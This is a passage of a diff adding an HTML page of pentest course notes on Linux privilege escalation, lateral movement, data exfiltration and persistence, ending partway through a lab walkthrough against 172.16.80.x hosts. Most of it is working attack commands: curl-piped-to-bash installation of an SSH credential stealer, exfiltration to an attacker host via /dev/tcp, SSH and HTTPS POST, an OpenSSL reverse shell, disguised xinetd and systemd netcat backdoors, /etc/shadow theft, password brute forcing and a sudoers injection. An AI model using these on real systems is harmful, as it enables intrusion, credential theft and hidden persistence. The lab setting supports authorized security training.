+  https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</p>
+  </li>
+  <li>
+    <p>Stack Clash (Multiple Distrivutions/Kernels)
+  https://blog.qualys.com/securitylabs/2017/06/19/the-stack-clash</p>
+  </li>
+  <li>
+    <p>DCCP Double-Free Privilege Escalation (4.4.0 Kernel / Ubuntu)
+  https://www.exploit-db.com/exploits/41458/</p>
+  </li>
+  <li>
+    <p>Race Condition Privilege Escalation (Linux Kernel &lt; 4.10.15)
+  https://www.exploit-db.com/exploits/43345/</p>
+  </li>
+</ul>
+
+<h4 id="categories">Categories</h4>
+<ul>
+  <li>Buffer Overflows</li>
+  <li>Memory Corruption</li>
+  <li>Denial-of-Service</li>
+  <li>Race Conditions</li>
+</ul>
+
+<h4 id="-advice-about-exploits">[+] Advice about exploits</h4>
+<ul>
+  <li>
+    <p>Linux Kernel exploits For our purposes will typically either be pre-compiled ELF binaries, C source code (.c files) which we will compile ourselves, or available via exploits frameworks such as metasploit.</p>
+  </li>
+  <li>Always take precaution when compiling and executing exploit code. Go the extra mile and try to understand what the exploit is actually doing behind-the-scenes.</li>
+  <li>Genetally exploits originating from most frameworks, ie metasploit, are ok since many eyes review them, but take extra caution with other exploit sources.</li>
+</ul>
+
+<h4 id="finding-the-right-kernel-exploit">FInding the Right Kernel Exploit</h4>
+<p>searchsploit:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit "linux kernel debian"
+</code></pre></div></div>
+
+<p>Linux_Exploit_Suggester:
+	https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl Linux_Exploit_Suggester.pl -k 2.6.38
+-k &lt;version&gt; = kernel version of the target
+or we can execute directly in the target without the -k switch
+</code></pre></div></div>
+
+<ul>
+  <li>Once we have identified several kernel exploits that are valid For our targets kernel version, we can move onto downloading the source code to the target.</li>
+  <li>Many require parameters that we will need to suply to the exploit command line in onder to get them working.</li>
+</ul>
+
+<h4 id="compiling-exploit-code">Compiling Exploit Code</h4>
+<ul>
+  <li>one requirement, is that GNU C/C++ Compiler is installed on the target</li>
+  <li>we can determine this by running <strong>gcc –version</strong> on the target system.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc exploit.c -o exploit
+chmod +x exploit
+./exploit
+</code></pre></div></div>
+
+<ul>
+  <li>if we need to compile to a 32bit architecture and the target does not have gcc, we can compile in our machine and specify the -m32 flag to gcc.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -m32 exploit.c -o exploit
+</code></pre></div></div>
+
+<h4 id="metasploit-kernel-exploits">Metasploit Kernel Exploits</h4>
+<p>use exploit/linux/local/… metasploit has a lot of options</p>
+
+<p>// lets image the scenario when we have a regular shell low privilege user.
+example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/linux/local/udev_netlink
+set sessions &lt;&gt;
+run
+</code></pre></div></div>
+
+<h4 id="kernelpop">Kernelpop</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/spencerdodd/kernelpop
+</code></pre></div></div>
+
+<ul>
+  <li>In addition to Metasploit and Searchsploit, we have a relatively new exploit framework designed For Linux and Max targets known as Kernelpop.</li>
+</ul>
+
+<h4 id="extra-resources-1">Extra resources</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/SecWiki/linux-kernel-exploits
+http://exploit-db.com/
+https://github.com/lucyoa/kernel-exploits
+</code></pre></div></div>
+
+<h3 id="unix-socket-exploitation">Unix Socket Exploitation</h3>
+<ul>
+  <li>The easiest to follow example on how to leverage an insufficiently secured Unix socket is Docker.</li>
+  <li>The docker daemon bind to a unix socket instead of a TCP port.</li>
+  <li>by default, that Unix Socket is owned by the user root; additionally, the docker always runs as the root user.</li>
+</ul>
+
+<p>// lets suppose that the low priv user has access to the docker command, or he is part of docker group.
+// and the docker unix socket is not protected by implementing the appropriate permissions.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run /etc/shadow:/docker/hashedpasswords -d postgres
+docker exec -ti {Container ID} bash
+cat /docker/hashedpasswords &gt; /docker/test.txt
+chmod 777 /docker/test.txt
+cat /docker/test.txt
+</code></pre></div></div>
+
+<h4 id="two-examples">two examples</h4>
+<ul>
+  <li>https://www.exploit-db.com/exploits/40962/</li>
+  <li>https://github.com/rapid7/metasploit-framework/pull/9408/files</li>
+</ul>
+
+<h4 id="tools-and-resources">Tools and Resources</h4>
+<ul>
+  <li>LinEnum - https://github.com/rebootuser/LinEnum</li>
+  <li>LinuxPrivChecker - https://github.com/sleventyeleven/linuxprivchecker</li>
+  <li>Unix-Privesc-Check - https://github.com/pentestmonkey/unix-privesc-check</li>
+  <li>Linux Exploit Suggester - https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</li>
+  <li>Searchsploit - https://www.exploit-db.com/searchsploit/</li>
+  <li>Kernelpop - https://github.com/spencerdodd/kernelpop</li>
+  <li>Basic Linux Privesc - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</li>
+  <li>Linux Post-Exploitation Command list - https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List</li>
+</ul>
+
+<h2 id="lateral-movement">Lateral Movement</h2>
+<ul>
+  <li>involves moving throughout the target organization from machine to machine, server to server using credentials we obtain through other phases, and further strengthening our foothold within the target infrastructure to the ultimate objective which is defined by the customer.</li>
+</ul>
+
+<h3 id="ssh-hijacking">SSH HIjacking</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://attack.mitre.org/wiki/Technique/T1184
+</code></pre></div></div>
+
+<ul>
+  <li>In order For this method to be successful, the compromised machine should have an active SSH session established to another machine via Public Key Authentication.</li>
+  <li>if we are root, its possible to compromise the SSH agent or access the SSH agents unix domain socket and hijack the connection.</li>
+  <li>the ssh-agent creates a unix domain socket, and then listens For connections from the sshd daemon to this socket.</li>
+  <li>the protection of the socket relies on simple unix permission, that means any authentication keys that are used with that socket can be retrieved by any user who can connect to the socket itself.</li>
+  <li>moreover = https://www.symantec.com/connect/articles/ssh-and-ssh-agent</li>
+</ul>
+
+<h4 id="how-to-attack">how to attack</h4>
+<ol>
+  <li>We first determine the SSH process ID of the user on the compromised host
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | grep sshd
+</code></pre></div>    </div>
+  </li>
+  <li>We determine the SSH_AUTH_SOCK environment variable For the sshd PID
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep SSH_AUTH_SOCK /proc/&lt;PID&gt;/environ
+</code></pre></div>    </div>
+  </li>
+  <li>Hijack the targets ssh-agent socket
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add -l
+</code></pre></div>    </div>
+  </li>
+  <li>Log into the remote system our victim is logged into as the target
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh remotesystem -l victim 
+</code></pre></div>    </div>
+    <ul>
+      <li>https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/</li>
+    </ul>
+  </li>
+</ol>
+
+<h4 id="if-you-have-root-access-and-want-to-discover-more-credentials">if you have root access and want to discover more credentials</h4>
+<ul>
+  <li>To steal SSH credentials we can use a malicious PAM module
+ → https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==</li>
+  <li>Through this malicious PAM module, every SSH connection attempt will be forwarded to a server under your control, accompanied by the credentials used For this connection attempt.</li>
+</ul>
+
+<p>on kali:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/mthbernardes/sshLooter
+cd sshLooter
+   // host and edit intall.sh and looter.py poiting the url variable to a server under your control, that can log POST request.
+</code></pre></div></div>
+
+<p>on the compromised machine:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;kali ip&gt;:8000/install.sh | bash
+</code></pre></div></div>
+
+<p>// you can now try the captured credentials against other identified machines in the network!</p>
+
+<h3 id="samba-secrets-to-domain-admin">Samba Secrets to Domain Admin</h3>
+<ul>
+  <li>when a new Samba user is created, this information is usually stored in what is known as the <strong>secrets.tdb</strong> file</li>
+  <li>In Samba version 4.7.4 on Debian, the secrets.tdb file is stored in the <strong>/var/lib/samba/private</strong> directory</li>
+  <li>if we are root:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tdbdump /var/lib/samba/private/secrets.tdb
+</code></pre></div></div>
+
+<p>// we can see which domain the machine is from
+// and that one of the data fields contains encoded data that decodes to the NTLM hash</p>
+
+<ul>
+  <li>
+    <p>Assuming the Samba server has a valid trust relationship with an Active DIrectory domain, we can decode the results of the tdbdump UTF8 encoded “data” fields to obtain the NTLM hash For the Samba computer account and ultimately pass-the-hash to AD using pth-smbclient</p>
+
+    <p>→ https://github.com/byt3bl33d3r/pth-toolkit</p>
+  </li>
+</ul>
+
+<p>// going from Samba server to AD as a computer account
+   → https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9</p>
+
+<h3 id="vpnpivot">VPNPivot</h3>
+<ul>
+  <li>creates a VPN tunnel between the attacker and compromised Linux host, and allows pivoting to other hosts internally within an organization that may be behind firewalls, NAT configurations, etc
+ → https://github.com/0x36/VPNPivot</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./autogen.sh
+./configure
+make &amp;&amp; make install
+</code></pre></div></div>
+
+<h3 id="dumping-stored-firefox-credentials">Dumping Stored Firefox Credentials</h3>
+<ul>
+  <li>Firefox when launched For the first time, creates a default profile For the user</li>
+  <li>/home/user/.mozilla/firefox and is a folder which is created with a random alphanumeric value and a <strong>.default</strong> string appended</li>
+  <li>These saved browser passwords are stored in the randomly named profile folder, in a file called <strong>logins.json</strong>, and can be dumped using a tool known as firefox_decrypt.py</li>
+  <li>https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py</li>
+  <li>We can copy the script and transfer to the target machine</li>
+  <li>and run:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python firefox_decrypt.py
+</code></pre></div></div>
+
+<blockquote>
+  <p>this tool will only work if the Master Password has not been set.</p>
+</blockquote>
+
+<h2 id="data-exfiltration">Data Exfiltration</h2>
+
+<ul>
+  <li>Some customers will want to include the simulation of an Advanced Persistent Threat (APT)</li>
+  <li>Once we have been able to obtain sensitive information or reach the objectives of the customer requirements, our goal with data exfiltration is to attempt to <strong>move</strong> the data we have acquired securely outside of the organization infrastructure to our attacker-controlled systems.</li>
+</ul>
+
+<h3 id="exfil-over-tcp-socket-with-ebcdic-and-base64">Exfil over TCP Socket with EBCDIC and Base64</h3>
+<ul>
+  <li>Creating a local TCP socket on the target system which points to our attacker machine while we configure a netcat listener to receive the data.</li>
+  <li>we will <strong>tar</strong> (archive) the data, encode it with Base64 and EBCDIC (Extended Binary Coded Decimal Interchange Code) encodings and ship the archive to our attacker system over a TCP socket in order to better obfuscate our traffic.</li>
+</ul>
+
+<h4 id="steps">Steps</h4>
+<ol>
+  <li>Netcat handler
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 80 &gt; datafolder.tmp
+</code></pre></div>    </div>
+  </li>
+  <li>encode and redirect the data over a local TCP socket
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic &gt; /dev/tcp/&lt;kali ip&gt;/80
+</code></pre></div>    </div>
+  </li>
+  <li>decode the received datafolder.tmp
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dd conv=ascii if=datafolder.tmp | base64 -d &gt; datafolder.tar
+</code></pre></div>    </div>
+  </li>
+  <li>Extract our tar archive
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar xf datafolder.tar
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="exfil-over-ssh">Exfil over SSH</h3>
+<ol>
+  <li>tar the contents and send to the output over SSH
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar zcf - /tmp/datafolder | ssh root@&lt;kali ip&gt; "cd /tmp; tar zxpf -"
+</code></pre></div>    </div>
+  </li>
+  <li>on kali, the data is already untared and in our /tmp/datafolder. We can simply browse to the /tmp/datafolder and view our data.</li>
+</ol>
+
+<p>// For extra <strong>stealthiness</strong>, we should configure our SSH server on port 80 For instance.
+// Just in case the customer is monitoring For SSH traffic over the standard port 22.</p>
+
+<h3 id="exfil-via-post-request-over-https">Exfil via POST Request over HTTPS</h3>
+<ul>
+  <li>we can transfer data over HTTPS/SSL, helping us evade heuristics detection over an encrypted channel.</li>
+  <li>with this method, we <strong>POST</strong> base64 encoded data over HTTPS to a PHP-based web server that is under our control. This method assumes you have a webserver that is PHP-enabled, and that you have an SSL certificate installed.</li>
+</ul>
+
+<ol>
+  <li>create a PHP file that will write data being received as a POST request
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'/tmp/datafolder.base64'</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'php://input'</span><span class="p">));</span> <span class="cp">?&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>curl to send a POST request consisting of the tared and base64-encoded data from the victims /tmp/datafolder directory. We send that POST request to our attacker-controlled PHP web servers contact.php file over SSL which will write a copy of the base64-encoded tar archive to a /tmp/datafolder.base64 file on our attacker system
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl --data "(tar zcf - /tmp/datafolder | base64)" https://&lt;kali ip&gt;/contact.php
+</code></pre></div>    </div>
+  </li>
+  <li>decode the data while redirecting the output to a datafolder.tar archive, and extract
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /tmp/datafolder.base64 | base64 -d &gt; datafolder.tar &amp;&amp; tar xf datafolder.tar
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="maintaning-access--persistence">Maintaning Access &amp; Persistence</h2>
+
+<ul>
+  <li>All of the methods we will cover take advantage of utilities that are already installed on a target Linux machine. The less we need to bring to a machine, the better.</li>
+  <li>This reduces our footprint on a compromised host and leaves less of a trail.</li>
+</ul>
+
+<h3 id="reverse-shells">Reverse Shells</h3>
+<ul>
+  <li>Are connections that are initiated from a compromised host and connect back to an attacker Command and Control (C2) or in simpler scenarios, to a basic listener service.</li>
+  <li>We need to find new ways to create connections back using lesser-known methods or methods that might not be necessarily expected.</li>
+</ul>
+
+<h4 id="openssl-reverse-shell">OpenSSL Reverse Shell</h4>
+<ul>
+  <li>OpenSSL client and server-based technique in conjunction with what are known as mkfifo names pipes.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkfifo named pipe creates a named instance (a file) of a series of piped commands, as a file on the filesystem, which can be referenced and used to redirect (&lt;&gt;) output to and from the named pipe (file).
+</code></pre></div></div>
+
+<h4 id="understanding-the-mkfifo-process">Understanding the Mkfifo process</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkfifo a_pipe
+gzip -9 -c &lt; a_pipe &gt; out.gz &amp;
+cat /etc/passwd &gt; a_pipe
+gunzip out.gz
+cat out
+</code></pre></div></div>
+
+<ul>
+  <li>create our pipe (a_pipe)</li>
+  <li>create a gzip process which our pipe will listen For input from, and when input is received, will redirect it to a file called <strong>out.gz</strong>. We run it as a background process (&amp;)</li>
+  <li><strong>cat</strong> the passwd file and redirect the output to out a_pipe which creates an <strong>out.gz</strong> file containing out catd content.</li>
+  <li>extract our out.gz file, and we can see that the <strong>out</strong> contents contained the results of out cat /etc/passwd command.</li>
+</ul>
+
+<h4 id="back-to-the-openssl-reverse-shell">back to the OpenSSL Reverse Shell</h4>
+<ul>
+  <li>Generate an SSL certificate key pair For our listener on the attacker machine</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+</code></pre></div></div>
+<p>// this will create two files <strong>key.pem</strong> and <strong>cert.pem</strong>. For our listener.</p>
+
+<ul>
+  <li>start our listener using openssl</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl s_server -quit -key key.pem -cert cert.pem -port 443
+</code></pre></div></div>
+
+<ul>
+  <li>on the target, create mkfifo named pipe that will connect back to our attacker (over SSL)</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkfifo /tmp/x; /bin/sh -i &lt; /tmp/x 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;kali ip&gt;:443 &gt; /tmp/x; rm /tmp/x
+</code></pre></div></div>
+
+<h4 id="icmp-reverse-shell">ICMP Reverse Shell</h4>
+<ul>
+  <li>can be accomplished with a tool known as icmpsh
+ → https://inquisb.github.io/icmpsh/</li>
+  <li>its based on a <strong>master/slave</strong> setup and will initiate reverse shells to an attacker system using ICMP packets.</li>
+</ul>
+
+<h4 id="reverse-shell-resources-">Reverse Shell Resources [+]</h4>
+<p>→ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+   → https://highon.coffee/blog/reverse-shell-cheat-sheet/</p>
+
+<h3 id="staged-vs-stageless-payloads">Staged vs Stageless Payloads</h3>
+<p>→ https://github.com/rapid7/metasploit-framework/issues/7297</p>
+
+<ul>
+  <li>
+    <p>Stageless payloads are typically larger in size that the standard staged payloads, the primary reason being that they include the payload within the binary, rather than being <strong>pushed</strong> to the target system via the handler once a connection is established.</p>
+  </li>
+  <li>stageless payloads use an <strong>_</strong> in their name as can be seen above.</li>
+  <li>example:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>windows/meterpreter/reverse_tcp &gt; staged
+windows/meterpreter_reverse_tcp &gt; stageless
+</code></pre></div></div>
+
+<p>→ moreover: http://buffered.io/posts/staged-vs-stageless-handlers/</p>
+
+<h4 id="xinetd-udp-portknock-backdoor">Xinetd UDP Portknock Backdoor</h4>
+<ul>
+  <li>The built-in <strong>xinetd</strong> daemon, which is used to manage network-based services on Linux Systems.</li>
+  <li>Xinetd listens For incoming requests to ports we can define, and when a specific request is received, we can have it execute a command of our choosing.</li>
+  <li>We create a xinetd service, that listens on UDP port, which we can send a single packet</li>
+  <li>Once the packet is received to the port we define, it will initiate a netcat reverse shell back to our attacker system.</li>
+  <li>We are calling it a UDP port-knock backdoor because once we <strong>knock</strong> on our UDP port, it gives us an immediate reverse shell.</li>
+  <li>it will persiste across reboots</li>
+</ul>
+
+<h4 id="steps-1">Steps</h4>
+<ol>
+  <li>on the target, create a custom xinetd service. run the bash script https://gist.github.com/anonymous/3cb8e474b6bb3fd3787bda1e1a55cf56</li>
+</ol>
+
+<ul>
+  <li>make sure to modify the attacker ip and attacker port strings.</li>
+  <li>the script, when executed, will create a new xinetd service called <strong>services-udp</strong>. The <strong>services-udp</strong> custom service will be configured to listen on port 65534 UDP on the target machine.</li>
+  <li>its also required that netcat is on the target in the usual /bin/ directory. It will copy the nc executable to a file called <strong>/bin/services-udp</strong>.</li>
+  <li>We are obscuring netcat as another file in this case.</li>
+</ul>
+
+<ol>
+  <li>on kali, start a handler with the same port defined in the xinetd script.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 4444
+</code></pre></div>    </div>
+  </li>
+  <li>We will use a tool called hping3 to send a single UDP packet to port 65534 on the target host, the services-udp netcat binary will be triggered and send us a reverse shell. The hping command we will use is:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hping3 -2 -c 1 &lt;target ip&gt; -p 65534
+</code></pre></div>    </div>
+    <p>// https://tools.kali.org/information-gathering/hping3</p>
+  </li>
+</ol>
+
+<h4 id="systemd-netcat-bind-shell">Systemd Netcat Bind Shell</h4>
+<ul>
+  <li>it will also persist through reboots</li>
+  <li>Systemd is used to launch services and processes and system startup.</li>
+  <li>similar to Xinetd backdoor, but this one will create a <strong>bind shell</strong>, rather than a reverse shell</li>
+</ul>
+
+<ol>
+  <li>on the target, copy the /bin/nc to /lib/systemd directory as <strong>systemd-service</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cp /bin/nc /lib/systemd/systemd-service
+</code></pre></div>    </div>
+  </li>
+  <li>on the target, create a file called /lib/systemd/system/systemd.service:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Unit]
+Description = Systemd Service
+After = network.target
+[Service]
+ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh
+[Install]
+WantedBy = multi-user.target
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>// the above systemd service config will create a bind shell on port 56825 TCP</p>
+
+<ol>
+  <li>enable and start the Systemd Netcat Bind Shell Service:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl enable systemd.service
+symtemctl start systemd.service
+</code></pre></div>    </div>
+  </li>
+  <li>confirm if that port For our custom service is listening on the target:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -auntp | grep 56825
+</code></pre></div>    </div>
+  </li>
+  <li>from kali, connect to the port
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;target ip&gt; 56825
+</code></pre></div>    </div>
+    <blockquote>
+      <p>it will persist on reboots and will be listed as <strong>systemd-service</strong> if listing processes</p>
+    </blockquote>
+  </li>
+</ol>
+
+<h2 id="lab-3---remote-and-post-exploitation">Lab 3 - Remote and Post Exploitation</h2>
+
+<p>Netblock: 172.16.80.1/24
+domain: robotstogo.localdomai</p>
+
+<p>ip: 172.16.80.7</p>
+
+<p>172.16.80.22
+172.16.80.24
+172.16.80.27
+172.16.80.26</p>
+
+<h3 id="task1">Task1</h3>
+
+<h4 id="unauthenticated-backdoor">Unauthenticated backdoor</h4>
+<ul>
+  <li>172.16.80.27</li>
+</ul>
+
+<h4 id="scan-the-ports">Scan the ports</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sS 172.16.80.27 -p-
+
+60666/tcp open unknown
+</code></pre></div></div>
+
+<h4 id="connect-to-the-uncommon-port">connect to the uncommon port</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 172.16.80.27 60666
+- listening on [any] 60667 = it appears that it has a backdoor in the 60667 port, lets connect 
+nc 172.16.80.27 60667
+// we have user access
+</code></pre></div></div>
+
+<h4 id="get-a-better-shell-with-python">get a better shell with python</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c "import pty; pty.spawn('/bin/bash')"
+export TERM=xterm
+</code></pre></div></div>
+
+<h4 id="check-if-the-user-can-run-any-program-as-root">check if the user can run any program as root</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+/bin/nano /home/*/*/readme.txt
+</code></pre></div></div>
+
+<p>// it seems that we can run nano with root privileges in that specific folder
+  // the file does not exist, so lets create it</p>
+
+<h4 id="create-the-file">create the file</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /home/&lt;user&gt; &amp;&amp; mkdir foo &amp;&amp; cd foo
+ls -s /etc/shadow readme.txt
+</code></pre></div></div>
+
+<blockquote>
+  <p>this will create a symbolic link to the /etc/shadow file</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -als
+</code></pre></div></div>
+
+<h4 id="grab-the-file-as-root">grab the file as root</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /bin/nano /home/&lt;user&gt;/foo/readme.txt
+</code></pre></div></div>
+
+<p>// this will open the /etc/shadow file
+ // now we can grab to decode or pass the hash, whatever
+ // there is endless possibilities</p>
+
+<h3 id="enum-the-samba">enum the Samba</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux -a 172.16.80.27
+</code></pre></div></div>
+
+<p>// we discovered here, a lot of users
+// save these users into a file users.txt
+// then lets try to log with rockyou.txt For passwords</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.16.80.27
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// this will take a time, and i dont like to wait too much
+// the solution says that we can use james user and grab the first 500 entries from rockyou.txt
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>head -n 500 /usr/share/wordlists/rockyou.txt &gt; top-500.txt
+hydra -l james -P top-500.txt ssh://172.16.80.27
+// 5 minutes later, we have the password
+[22][ssh] host: 172.16.80.27   login: james   password: 159357
+</code></pre></div></div>
+
+<h4 id="log-with-ssh-and-execute-sudo--l-to-see-the-possibilities">log with SSH and execute sudo -l to see the possibilities</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(root) /usr/sbin/tcpdump - we have tcpdump access
+</code></pre></div></div>
+
+<p>// we can search in GTFObins
+// there is something we can use</p>
+
+<p>→  https://gtfobins.github.io/gtfobins/tcpdump/</p>
+
+<h4 id="from-gtdobins">from gtdobins</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">COMMAND</span><span class="o">=</span><span class="s1">'id'</span>
+<span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$COMMAND</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nv">$TF</span>
+<span class="nb">chmod</span> +x <span class="nv">$TF</span>
+<span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> lo <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> <span class="nv">$TF</span> <span class="nt">-Z</span> root
+
+</code></pre></div></div>
+
+<h4 id="the-solution-gave-this-alternative-both-works-great">the solution gave this alternative, both works great</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">$ </span><span class="nb">cat</span> <span class="o">&gt;</span> /tmp/elevate
+<span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"james ALL=(root) NOPASSWD: ALL"</span> <span class="o">&gt;&gt;</span> /etc/sudoers
+
+<span class="nb">chmod</span> +x /tmp/elevate
+
+<span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> eth0 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/elevate <span class="nt">-Z</span> root
+<span class="nb">sudo </span>bash
+
+</code></pre></div></div>
+
+<h3 id="share-enumeration">Share enumeration</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 smbmap.py -H 172.16.80.27
+</code></pre></div></div>
+
+<p>// found the web share with READ/WRITE permissions</p>
+
+<p>Alternatively,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script smb-enum-shares 172.16.80.27
+</code></pre></div></div>
+
+<h4 id="access-that-share">Access that share</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N \\\\172.16.80.27\\web -U ""
+ls
+</code></pre></div></div>
+
+<p>// lets upload a perl reverse shell
+// Kalis location: /usr/share/webshells/perl/perl-reverse-shell.pl
+// remember to change the ip address of the attacker (kali ip)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>put perl-reverse-shell.pl
+</code></pre></div></div>
+
+<h4 id="open-a-listener">open a listener</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nv -lvnp 1234
+ open the file in the browser
+</code></pre></div></div>
+
+<blockquote>
+  <p>we have a shell as www-data</p>
+</blockquote>
+
+<h3 id="172168022">172.16.80.22</h3>
+
+<ul>
+  <li>This scan took so long, that I lost all my will.</li>
+  <li>anyway, there is a RMI Registry service listening on a non-standard port of 1999</li>
+  <li>research on google. Its vulnerable to arbitrary loading of java classes</li>
+</ul>
+
+<p>msf:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use expĺoit/multi/misc/java_rmi_server
+set options
+run
+// we have a shell as todd - a low level user
+</code></pre></div></div>
+
+<h4 id="lets-enter-in-the-session">lets enter in the session</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>session -i 1
+shell
+uname -a
+// to grab the kernel version
+// we can also excute python pty and xterm to get a better shell
+kernel version: 2.6.24-16
